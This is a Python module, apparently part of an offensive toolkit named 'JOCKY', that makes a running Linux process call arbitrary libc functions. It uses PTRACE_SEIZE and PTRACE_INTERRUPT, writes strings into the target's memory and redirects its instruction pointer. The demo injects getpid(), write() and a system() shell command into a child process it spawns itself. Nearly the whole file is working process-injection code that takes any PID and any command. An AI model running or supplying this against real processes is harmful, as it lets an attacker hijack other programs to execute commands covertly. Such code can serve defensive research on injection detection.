"""
JOCKY Framework — Module 13: ptrace Function Call Injection (Linux)

Makes a running process execute an arbitrary libc function with arguments
we control. Modern Linux equivalent of Windows thread execution hijacking.

Key insight: PTRACE_ATTACH lands the target at a syscall-stop, where the
kernel ignores RIP redirection. The fix: use PTRACE_SEIZE + PTRACE_INTERRUPT
which stops the target at its current USERSPACE instruction — not at a
syscall boundary. From there, RIP redirection is honored.
"""

import ctypes
import os
import signal
import struct
import subprocess
import sys
import time


# ptrace requests
PTRACE_PEEKDATA      = 2
PTRACE_POKEDATA      = 5
PTRACE_GETREGS       = 12
PTRACE_SETREGS       = 13
PTRACE_CONT          = 7
PTRACE_ATTACH        = 16
PTRACE_DETACH        = 17
PTRACE_SEIZE         = 0x4206
PTRACE_INTERRUPT     = 0x4207
PTRACE_LISTEN        = 0x4208

# ptrace options (for PTRACE_SEIZE)
PTRACE_O_TRACESYSGOOD = 0x00000001
PTRACE_O_EXITKILL     = 0x00100000

# SIGTRAP | 0x80 is the syscall-stop marker; we want to avoid it
SIGTRAP = 5


REG_NAMES = [
    "r15", "r14", "r13", "r12", "rbp", "rbx",
    "r11", "r10", "r9", "r8", "rax", "rcx",
    "rdx", "rsi", "rdi", "orig_rax", "rip", "cs",
    "eflags", "rsp", "ss", "fs_base", "gs_base",
    "ds", "es", "fs", "gs",
]
REGS_FMT = "Q" * 27
REGS_SIZE = struct.calcsize(REGS_FMT)

# System V AMD64 ABI argument registers
ARG_REGS = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.restype = ctypes.c_long


# ---------- ptrace primitives ----------
def ptrace(request, pid, addr=0, data=0):
    return int(libc.ptrace(
        ctypes.c_ulong(request), ctypes.c_long(pid),
        ctypes.c_void_p(addr), ctypes.c_void_p(data),
    ))


def get_regs(pid):
    buf = ctypes.create_string_buffer(REGS_SIZE)
    if libc.ptrace(
        ctypes.c_ulong(PTRACE_GETREGS), ctypes.c_long(pid),
        ctypes.c_void_p(0), ctypes.cast(buf, ctypes.c_void_p),
    ) < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"GETREGS: {os.strerror(err)}")
    return dict(zip(REG_NAMES, struct.unpack(REGS_FMT, buf.raw)))


def set_regs(pid, regs):
    values = [regs[n] for n in REG_NAMES]
    buf = ctypes.create_string_buffer(struct.pack(REGS_FMT, *values))
    if libc.ptrace(
        ctypes.c_ulong(PTRACE_SETREGS), ctypes.c_long(pid),
        ctypes.c_void_p(0), ctypes.cast(buf, ctypes.c_void_p),
    ) < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"SETREGS: {os.strerror(err)}")


def peek_word(pid, addr):
    ret = ptrace(PTRACE_PEEKDATA, pid, addr, 0)
    if ret == -1:
        err = ctypes.get_errno()
        if err:
            raise OSError(err, f"PEEKDATA {hex(addr)}: {os.strerror(err)}")
    return ret & 0xFFFFFFFFFFFFFFFF


def poke_word(pid, addr, value):
    if ptrace(PTRACE_POKEDATA, pid, addr, value) < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"POKEDATA {hex(addr)}: {os.strerror(err)}")


def write_bytes(pid, addr, data):
    n = len(data)
    i = 0
    while i < n:
        chunk = data[i:i+8]
        if len(chunk) == 8:
            word = struct.unpack("<Q", chunk)[0]
        else:
            existing = peek_word(pid, addr + i)
            mask = (1 << (len(chunk) * 8)) - 1
            word = (existing & ~mask) | struct.unpack(
                "<Q", chunk.ljust(8, b"\x00"))[0]
        poke_word(pid, addr + i, word)
        i += 8


def read_bytes(pid, addr, length):
    words = (length + 7) // 8
    out = b""
    for i in range(words):
        out += struct.pack("<Q", peek_word(pid, addr + i * 8))
    return out[:length]


# ---------- Address resolution ----------
def find_function_address(pid, symbol_name):
    libc_base = None
    libc_path = None
    try:
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                if "libc" not in line:
                    continue
                parts = line.split()
                if len(parts) < 2:
                    continue
                if "x" not in parts[1]:
                    continue
                libc_base = int(parts[0].split("-")[0], 16)
                libc_path = parts[-1] if len(parts) >= 6 else None
                break
    except FileNotFoundError:
        return None
    if libc_base is None:
        return None

    candidates = []
    if libc_path and libc_path.startswith("/"):
        candidates.append(libc_path)
    candidates.extend([
        "/lib/x86_64-linux-gnu/libc.so.6",
        "/usr/lib/x86_64-linux-gnu/libc.so.6",
        "/lib64/libc.so.6",
    ])

    for libpath in candidates:
        try:
            result = subprocess.run(
                ["readelf", "-sW", libpath],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode != 0:
                continue
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 8 and parts[3] == "FUNC":
                    base_name = parts[7].split("@")[0]
                    if base_name == symbol_name:
                        return libc_base + int(parts[1], 16)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


def find_writable_data_page(pid):
    candidates = []
    try:
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                parts = line.split()
                if len(parts) < 2:
                    continue
                perms = parts[1]
                if "w" not in perms or "x" in perms:
                    continue
                if any(tag in line for tag in
                       ("[vvar]", "[vdso]", "[vsyscall]", "[stack]")):
                    continue
                addr_range = parts[0]
                start = int(addr_range.split("-")[0], 16)
                end = int(addr_range.split("-")[1], 16)
                candidates.append({
                    "start": start, "end": end, "size": end - start,
                    "is_heap": "[heap]" in line,
                })
    except FileNotFoundError:
        return None

    if not candidates:
        return None
    heap = [c for c in candidates if c["is_heap"]]
    if heap:
        return (heap[0]["start"] + 0x1000) & ~0xFFF
    candidates.sort(key=lambda c: c["size"], reverse=True)
    c = candidates[0]
    return (c["start"] + min(0x10000, c["size"] // 2)) & ~0xFFF


# ---------- Seize-based attach (the key fix) ----------
def seize_and_interrupt(pid, verbose=True):
    """
    Attach via PTRACE_SEIZE + PTRACE_INTERRUPT.
    This stops the target at its current USERSPACE instruction — not at a
    syscall boundary — so RIP redirection will be honored on resume.
    """
    if verbose:
        print(f"[seize] PTRACE_SEIZE → {pid}", flush=True)
    ret = ptrace(PTRACE_SEIZE, pid, 0,
                 PTRACE_O_TRACESYSGOOD | PTRACE_O_EXITKILL)
    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"PTRACE_SEIZE: {os.strerror(err)}")

    if verbose:
        print(f"[seize] PTRACE_INTERRUPT → {pid}", flush=True)
    if ptrace(PTRACE_INTERRUPT, pid, 0, 0) < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"PTRACE_INTERRUPT: {os.strerror(err)}")

    # Wait for the interrupt stop
    _, status = os.waitpid(pid, 0)
    if not os.WIFSTOPPED(status):
        raise RuntimeError(f"target did not stop: status={status}")

    sig = os.WSTOPSIG(status)
    event = (status >> 16) & 0xFFFF
    if verbose:
        print(f"[seize] stopped: signal={sig} event={event}", flush=True)
    return status


# ---------- Core: function call injection ----------
def funcall_inject(pid, func_name, args, verbose=True):
    if len(args) > 6:
        raise ValueError("max 6 arguments")

    attached = False
    try:
        # STEP 1: Seize + interrupt (userspace stop)
        seize_and_interrupt(pid, verbose=verbose)
        attached = True

        orig = get_regs(pid)
        if verbose:
            print(f"[funcall] orig RIP={hex(orig['rip'])} RSP={hex(orig['rsp'])}",
                  flush=True)

        # STEP 2: Resolve function
        func_addr = find_function_address(pid, func_name)
        if func_addr is None:
            raise RuntimeError(f"could not resolve {func_name}")
        if verbose:
            print(f"[funcall] {func_name}() at {hex(func_addr)}", flush=True)

        # STEP 3: Write string args to data page
        data_page = None
        backups = []
        arg_values = []
        offset = 0
        for val, typ in args:
            if typ == "int":
                arg_values.append(val)
            elif typ == "str":
                if data_page is None:
                    data_page = find_writable_data_page(pid)
                    if data_page is None:
                        raise RuntimeError("no writable page")
                    if verbose:
                        print(f"[funcall] data page at {hex(data_page)}", flush=True)
                buf = val.encode() + b"\x00"
                backups.append((offset,
                                read_bytes(pid, data_page + offset, len(buf) + 8)))
                write_bytes(pid, data_page + offset, buf)
                arg_values.append(data_page + offset)
                offset += (len(buf) + 7) & ~7

        # STEP 4: Prepare registers
        regs = dict(orig)

        # Stack alignment: System V ABI needs RSP % 16 == 8 at fn entry
        new_rsp = (orig["rsp"] & ~0xF) - 8
        try:
            write_bytes(pid, new_rsp, b"\x00" * 8)
        except OSError:
            new_rsp = (orig["rsp"] - 16) & ~0xF
            write_bytes(pid, new_rsp, b"\x00" * 8)

        # Sanitize segment registers
        regs["cs"] = 0x33
        regs["ss"] = 0x2b
        regs["eflags"] = (regs["eflags"] | 0x200) & ~0x100

        for i, v in enumerate(arg_values):
            regs[ARG_REGS[i]] = v

        regs["rsp"] = new_rsp
        regs["rip"] = func_addr

        set_regs(pid, regs)

        # Verify RIP was written
        check = get_regs(pid)
        if verbose:
            rip_ok = check["rip"] == func_addr
            print(f"[funcall] VERIFY RIP={hex(check['rip'])}"
                  + ("" if rip_ok else f"  ✗ expected {hex(func_addr)}"),
                  flush=True)
            if not rip_ok:
                raise RuntimeError("SETREGS did not apply RIP")

        # STEP 5: Resume (continue WITHOUT delivering a signal)
        ptrace(PTRACE_CONT, pid, 0, 0)
        _, status = os.waitpid(pid, 0)

        return_value = None
        if os.WIFSTOPPED(status):
            sig = os.WSTOPSIG(status)
            try:
                stopped_regs = get_regs(pid)
                return_value = stopped_regs["rax"]
            except OSError:
                pass
            if verbose:
                print(f"[funcall] stopped: signal={sig}"
                      + (f" RAX={return_value}" if return_value is not None else ""),
                      flush=True)

        # STEP 6: Restore
        for off, orig_bytes in backups:
            try:
                write_bytes(pid, data_page + off, orig_bytes)
            except OSError:
                pass
        set_regs(pid, orig)
        if verbose:
            print(f"[funcall] restored, detaching", flush=True)

        return True, return_value

    except Exception as e:
        if verbose:
            print(f"[funcall] ERROR: {e}", flush=True)
        return False, None

    finally:
        if attached:
            try:
                ptrace(PTRACE_DETACH, pid, 0, 0)
            except OSError:
                pass


# ---------- Demo ----------
def demo():
    print("=" * 70, flush=True)
    print("JOCKY ptrace Function Call Injection — SEIZE Edition", flush=True)
    print("=" * 70, flush=True)

    pid = os.fork()
    if pid == 0:
        devnull = os.open("/dev/null", os.O_WRONLY)
        os.dup2(devnull, 1)
        os.execvp("yes", ["yes"])
        os._exit(127)

    time.sleep(0.5)
    print(f"[demo] Target PID: {pid}  (yes — busy in userspace)", flush=True)
    print(flush=True)

    # Test 1: getpid() — return value = target's actual PID
    print("[demo] Test 1: getpid()", flush=True)
    ok1, ret1 = funcall_inject(pid, "getpid", [])
    match1 = ok1 and ret1 == pid
    print(f"[demo] getpid() -> {'PASS' if match1 else 'FAIL'} "
          f"(returned {ret1}, expected {pid})", flush=True)
    print(flush=True)

    # Test 2: write() — writes marker to target's stdout (redirected to /dev/null)
    # To verify, we check the return value: should be len(msg)
    msg = "JOCKY-INJECTED-VIA-PTRACE-SEIZE\n"
    print("[demo] Test 2: write(1, msg, len)", flush=True)
    ok2, ret2 = funcall_inject(pid, "write", [
        (1, "int"),
        (msg, "str"),
        (len(msg), "int"),
    ])
    match2 = ok2 and ret2 == len(msg)
    print(f"[demo] write() -> {'PASS' if match2 else 'FAIL'} "
          f"(returned {ret2}, expected {len(msg)})", flush=True)
    print(flush=True)

    # Test 3: system() — writes to a marker file
    marker = f"/tmp/jocky_seize_{os.getpid()}.txt"
    if os.path.exists(marker):
        os.unlink(marker)
    cmd = f"/bin/sh -c 'echo SEIZE_INJECTED_PID_{pid} > {marker}'"
    print(f"[demo] Test 3: system('...') → {marker}", flush=True)
    ok3, ret3 = funcall_inject(pid, "system", [(cmd, "str")])
    time.sleep(0.4)
    if os.path.exists(marker):
        with open(marker) as f:
            print(f"[demo] Marker: {f.read().strip()}", flush=True)
        os.unlink(marker)
        match3 = True
    else:
        match3 = False
    print(f"[demo] system() -> {'PASS' if match3 else 'FAIL'} "
          f"(returned {ret3})", flush=True)

    print(flush=True)
    print("=" * 70, flush=True)
    print("FINAL RESULTS", flush=True)
    print("=" * 70, flush=True)
    print(f"  getpid() : {'✓ PASS' if match1 else '✗ FAIL'}", flush=True)
    print(f"  write()  : {'✓ PASS' if match2 else '✗ FAIL'}", flush=True)
    print(f"  system() : {'✓ PASS' if match3 else '✗ FAIL'}", flush=True)

    try:
        os.kill(pid, signal.SIGKILL)
    except ProcessLookupError:
        pass


if __name__ == "__main__":
    demo()
